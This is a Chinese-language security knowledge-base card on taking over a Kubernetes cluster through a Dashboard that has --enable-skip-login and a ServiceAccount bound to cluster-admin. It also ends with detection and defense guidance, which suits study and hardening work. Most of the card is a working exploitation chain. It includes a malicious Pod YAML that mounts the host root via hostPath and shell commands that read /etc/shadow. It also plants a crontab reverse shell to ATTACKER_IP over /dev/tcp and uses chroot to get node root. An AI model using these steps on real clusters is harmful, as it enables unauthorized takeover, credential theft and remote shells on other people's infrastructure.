---
id: cloud-k8s-dashboard-skip-login-cluster-admin-takeover
title: Kubernetes Dashboard enable-skip-login 且绑定 cluster-admin 导致未授权接管集群
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-dashboard-skip-login-takeover
tags:
- k8s
- kubernetes
- dashboard
- rbac
- cluster-admin
- unauthorized
- container-escape
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:10:34+08:00'
  notes: 已对照原文与图片51-55核对：Deployment args含--enable-skip-login，ClusterRoleBinding绑定cluster-admin，登录页有“跳过”按钮，进入后创建hostPath:/的Pod并在/mnt读写宿主机。卡内利用链与原文一致，并注明SA权限/暴露方式是前提。原文未给受影响版本；PoC未本机执行；frontmatter无sources/source_url。
url: /docs/cloud/k8s/cloud-k8s-dashboard-skip-login-cluster-admin-takeover/
draft: false
kb_aliases:
- K8s Dashboard 未授权
- enable-skip-login
- Dashboard Skip 按钮
- kubernetes-dashboard cluster-admin
- Dashboard NodePort 暴露
---

## 一句话结论

Kubernetes Dashboard 启动参数带 `--enable-skip-login` 时，登录页会出现“跳过”按钮；若 Dashboard 的 ServiceAccount 又被绑定 `cluster-admin`，任何能访问 Dashboard（NodePort/LoadBalancer/Ingress 暴露）的人都能跳过登录，以集群管理员权限创建挂载宿主机根目录的 Pod 并逃逸。

## 原理

- Dashboard 默认要求 Bearer Token 或 Kubeconfig 登录；`--enable-skip-login` 会显示“跳过”按钮，跳过认证直接进入管理界面。
- Dashboard 后端使用自身 ServiceAccount 访问 API Server。如果该 SA 被绑定 `cluster-admin`（常见于“让 Dashboard 能管理所有资源”的配置），跳过登录即等价于拿到集群最高权限。
- 通过 Dashboard 的“创建资源”功能提交带 `hostPath: /` 的 Pod，Pod 内可读写宿主机根文件系统；再写宿主机 crontab 或 `chroot /host` 获取节点 root。
- 暴露面常见于 `NodePort`（如 30001）、`LoadBalancer`、Ingress；默认 ClusterIP 仅集群内可达，风险较低。
- 该漏洞是配置错误组合，不是 Dashboard 代码漏洞；需要 Dashboard 可被攻击者网络访问。

## 触发条件

- Dashboard 启用 `--enable-skip-login`。
- Dashboard ServiceAccount 绑定 `cluster-admin` 或等价高权限 ClusterRole。
- Dashboard 通过 NodePort/LoadBalancer/Ingress 暴露到攻击者可达网络。
- 集群未启用 PodSecurity/准入控制阻止 hostPath/privileged Pod。

## 利用步骤

1. 扫描/访问 `https://TARGET:30001` 等 Dashboard 地址，确认登录页出现“跳过/Skip”按钮。
2. 点击跳过进入管理界面；若提示权限不足，说明 SA 权限不够，需另找入口。
3. 进入“创建资源”/“输入并创建”，粘贴带 `hostPath: /` 的 Pod YAML。
4. 创建后进入 Pod 的 Shell，`cd /mnt` 或 `/host` 访问宿主机根目录。
5. 写宿主机 crontab 反弹 shell，或 `chroot /host /bin/bash` 直接获取节点 root。
6. 记录 Pod/ServiceAccount/ClusterRoleBinding 证据；清理创建的 Pod 与定时任务。

## PoC

恶意 Pod YAML（Dashboard 创建资源）：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: dashboard-lala
spec:
  containers:
  - image: nginx
    name: test-container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```

登录页跳过（示意）：

```text
https://TARGET:30001/#/login  -> 点击“跳过”
```

创建后进入 Shell：

```bash
cd /mnt
cat etc/shadow
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/6677 0>&1' >> /mnt/etc/crontab
chroot /mnt /bin/bash
```

检查 Dashboard 配置（有权限时）：

```bash
kubectl -n kubernetes-dashboard get deploy kubernetes-dashboard -o yaml | grep -A2 args
kubectl get clusterrolebinding kubernetes-dashboard -o yaml
```

## 变体与关联

- 变体：Dashboard 未开启 skip-login，但 Token 泄露/弱 Token/默认 SA Token 可登录；登录后同样可创建 hostPath Pod。
- 变体：Dashboard 只读权限时，可利用 `get secrets` 读取高权限 Token，再横向。
- 变体：NodePort 端口不固定，可通过服务扫描/证书特征识别 Dashboard。
- 关联：[[cloud-k8s-k8s-apiserver-anonymous-access]]（API Server 未授权）。
- 关联：[[cloud-k8s-k8s-rbac-clusterrolebinding-privesc]]（RBAC 绑定 cluster-admin）。
- 关联：[[cloud-container-k8s-workload-config-escape]]（hostPath/privileged Pod 逃逸）。
- 注意：Dashboard 的 SA 名/命名空间随安装方式（官方 YAML、Helm）不同；先确认实际绑定。

## 检测与防御

- 防御：移除 `--enable-skip-login`；Dashboard SA 只授予必要命名空间的只读权限，禁止绑定 `cluster-admin`。
- 防御：Dashboard 仅通过 ClusterIP + `kubectl proxy`/内网访问，不要用 NodePort/LoadBalancer 暴露公网；启用 TLS、认证与 RBAC。
- 防御：启用 PodSecurity Standards/准入控制，禁止 hostPath `/`、privileged、hostPID/hostNetwork 的工作负载。
- 检测：Dashboard 登录页出现 Skip；匿名/跳过登录后的 API 请求；创建含 `hostPath: /` 的 Pod；Dashboard SA 的 ClusterRoleBinding 变更；NodePort 30000+ 暴露。
- 响应：删除恶意 Pod、回滚 RBAC、轮换 SA Token、检查节点 crontab/SSH/账号、审计 API Server 日志。
